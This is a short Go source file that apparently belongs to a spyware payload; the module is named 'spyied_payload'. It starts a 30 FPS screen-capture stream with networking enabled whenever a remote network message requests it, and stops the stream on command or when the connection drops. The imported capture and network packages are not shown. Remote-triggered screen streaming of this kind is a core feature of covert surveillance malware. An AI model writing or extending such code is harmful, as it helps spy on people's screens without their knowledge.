package activity

import (
	"spyied_payload/network"
	"spyied_payload/service/screen"
)

var screenConf = &screen.Config{
	TargetFPS:      30,
	DisplayIndex:   0,
	NetworkEnabled: true,
	BlockSize:      32,
}

var capturer *screen.Capturer

func startScreenStream() {
	capturer = screen.InitCapturer(screenConf)
	go capturer.CaptureLoop()
}

func stopScreenStream() {
	if capturer == nil {
		return
	}

	capturer.Stop()
	capturer = nil
}

func screenMsgHandler(p network.ScreenMSG) {
	if !p.ToPresent {
		stopScreenStream()
		return
	}

	startScreenStream()
}

func connStateChangedScreen(isConnected bool) {
	if !isConnected && capturer != nil {
		stopScreenStream()
		return
	}
}
